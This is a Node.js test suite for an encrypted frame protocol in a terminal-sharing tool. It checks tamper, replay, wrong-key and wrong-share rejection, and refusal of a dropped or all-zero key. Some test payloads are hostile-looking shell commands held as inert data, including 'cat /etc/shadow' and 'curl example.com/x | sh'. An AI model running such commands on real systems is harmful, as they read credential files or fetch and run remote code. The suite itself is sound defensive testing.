const test = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('crypto');
const frames = require('../src/main/shareFrame');

const SHARE_ID = 'shr_AAAAAAAAAAAAAAAAAAAAAA';

function session(overrides = {}) {
  return {
    key: crypto.randomBytes(32),
    shareId: SHARE_ID,
    memberId: 0,
    seq: 0,
    type: frames.FRAME_TYPE.output,
    ...overrides,
  };
}

test('a sealed frame opens again with the same key and share', () => {
  const sender = session();
  const frame = frames.seal(sender, Buffer.from('total 4\r\n'));

  const opened = frames.open({ key: sender.key, shareId: SHARE_ID, seen: new Map() }, frame);
  assert.equal(opened.plaintext.toString(), 'total 4\r\n');
  assert.equal(opened.type, frames.FRAME_TYPE.output);
  assert.equal(opened.memberId, 0);
  assert.equal(opened.seq, 0n);
});

test('the plaintext never appears in the frame', () => {
  const sender = session();
  const secret = 'hunter2-not-in-the-clear';
  const frame = frames.seal(sender, Buffer.from(secret));
  assert.equal(frame.includes(Buffer.from(secret)), false);
});

test('another share cannot open the frame, even with the key', () => {
  const sender = session();
  const frame = frames.seal(sender, Buffer.from('cat /etc/shadow\r\n'));

  const wrongShare = frames.open(
    { key: sender.key, shareId: 'shr_BBBBBBBBBBBBBBBBBBBBBB', seen: new Map() },
    frame,
  );
  assert.equal(wrongShare, null);
});

test('the wrong key opens nothing', () => {
  const sender = session();
  const frame = frames.seal(sender, Buffer.from('uptime\r\n'));
  const opened = frames.open({ key: crypto.randomBytes(32), shareId: SHARE_ID, seen: new Map() }, frame);
  assert.equal(opened, null);
});

test('relabelling a frame breaks it', () => {
  const sender = session();
  const frame = frames.seal(sender, Buffer.from('ls\r\n'));

  // Output passed off as keystrokes, or the owner's frame passed off as a
  // viewer's — both are covered by the AAD.
  const retyped = Buffer.from(frame);
  retyped.writeUInt8(frames.FRAME_TYPE.input, 1);
  assert.equal(frames.open({ key: sender.key, shareId: SHARE_ID, seen: new Map() }, retyped), null);

  const reassigned = Buffer.from(frame);
  reassigned.writeUInt16BE(7, 2);
  assert.equal(frames.open({ key: sender.key, shareId: SHARE_ID, seen: new Map() }, reassigned), null);
});

test('flipping a bit of ciphertext breaks it', () => {
  const sender = session();
  const frame = frames.seal(sender, Buffer.from('sudo reboot\r\n'));
  const tampered = Buffer.from(frame);
  tampered[frames.HEADER_BYTES] ^= 0x01;
  assert.equal(frames.open({ key: sender.key, shareId: SHARE_ID, seen: new Map() }, tampered), null);
});

test('a replayed frame is refused', () => {
  const sender = session();
  const seen = new Map();
  const first = frames.seal({ ...sender, seq: 1 }, Buffer.from('rm -rf /tmp/x\r\n'));

  assert.ok(frames.open({ key: sender.key, shareId: SHARE_ID, seen }, first));
  assert.equal(frames.open({ key: sender.key, shareId: SHARE_ID, seen }, first), null);

  // A frame from before the last one seen is refused too.
  const older = frames.seal({ ...sender, seq: 0 }, Buffer.from('older\r\n'));
  assert.equal(frames.open({ key: sender.key, shareId: SHARE_ID, seen }, older), null);

  const newer = frames.seal({ ...sender, seq: 2 }, Buffer.from('newer\r\n'));
  assert.equal(
    frames.open({ key: sender.key, shareId: SHARE_ID, seen }, newer).plaintext.toString(),
    'newer\r\n',
  );
});

test('each sender has its own sequence line', () => {
  const key = crypto.randomBytes(32);
  const seen = new Map();
  const fromOwner = frames.seal(session({ key, memberId: 0, seq: 5 }), Buffer.from('out'));
  const fromViewer = frames.seal(
    session({ key, memberId: 3, seq: 1, type: frames.FRAME_TYPE.input }),
    Buffer.from('in'),
  );

  assert.ok(frames.open({ key, shareId: SHARE_ID, seen }, fromOwner));
  // Member 3's sequence 1 is not behind member 0's sequence 5.
  assert.ok(frames.open({ key, shareId: SHARE_ID, seen }, fromViewer));
});

test('junk, empty payloads and unknown types are refused', () => {
  const sender = session();
  const context = { key: sender.key, shareId: SHARE_ID, seen: new Map() };

  assert.equal(frames.open(context, Buffer.alloc(0)), null);
  assert.equal(frames.open(context, Buffer.alloc(frames.HEADER_BYTES + 16)), null);
  assert.equal(frames.open(context, crypto.randomBytes(80)), null);

  const unknownType = Buffer.from(frames.seal(sender, Buffer.from('x')));
  unknownType.writeUInt8(9, 1);
  assert.equal(frames.open(context, unknownType), null);

  const futureVersion = Buffer.from(frames.seal(sender, Buffer.from('x')));
  futureVersion.writeUInt8(2, 0);
  assert.equal(frames.open(context, futureVersion), null);
});

test('a retired share opens nothing', () => {
  const sender = session();
  const frame = frames.seal(sender, Buffer.from('ls\r\n'));

  // A share drops its key the moment it is taken out of service. Anything
  // still arriving on a socket that has not finished closing must fail to
  // open rather than be handed to whatever the frame claims to be.
  for (const key of [null, undefined, Buffer.alloc(0), Buffer.alloc(16)]) {
    assert.equal(frames.open({ key, shareId: SHARE_ID, seen: new Map() }, frame), null);
  }
});

test('an all-zero key is not a usable substitute for a dropped one', () => {
  // Zeroing a key in place would leave a perfectly valid AES key behind, so
  // frames forged under it would authenticate. Sealing must refuse instead.
  const zeroed = session({ key: Buffer.alloc(32) });
  const forged = frames.seal(zeroed, Buffer.from('curl example.com/x | sh\r\n'));

  assert.equal(frames.open({ key: null, shareId: SHARE_ID, seen: new Map() }, forged), null);
  assert.throws(() => frames.seal(session({ key: null }), Buffer.from('x')), /no key/);
});

test('the share id binds the same whether given as text or bytes', () => {
  const sender = session();
  const frame = frames.seal({ ...sender, shareId: Buffer.from(SHARE_ID, 'utf8') }, Buffer.from('hi'));

  const asText = frames.open({ key: sender.key, shareId: SHARE_ID, seen: new Map() }, frame);
  assert.equal(asText.plaintext.toString(), 'hi');

  const otherShare = frames.open(
    { key: sender.key, shareId: Buffer.from('shr_BBBBBBBBBBBBBBBBBBBBBB', 'utf8'), seen: new Map() },
    frame,
  );
  assert.equal(otherShare, null);
});

test('output is split to stay under the relay frame ceiling', () => {
  const big = Buffer.alloc(frames.MAX_CHUNK_BYTES * 2 + 11, 0x61);
  const parts = frames.chunk(big);

  assert.equal(parts.length, 3);
  assert.deepEqual(Buffer.concat(parts), big);
  for (const part of parts) assert.ok(part.length <= frames.MAX_CHUNK_BYTES);

  const small = Buffer.from('short');
  assert.deepEqual(frames.chunk(small), [small]);
});
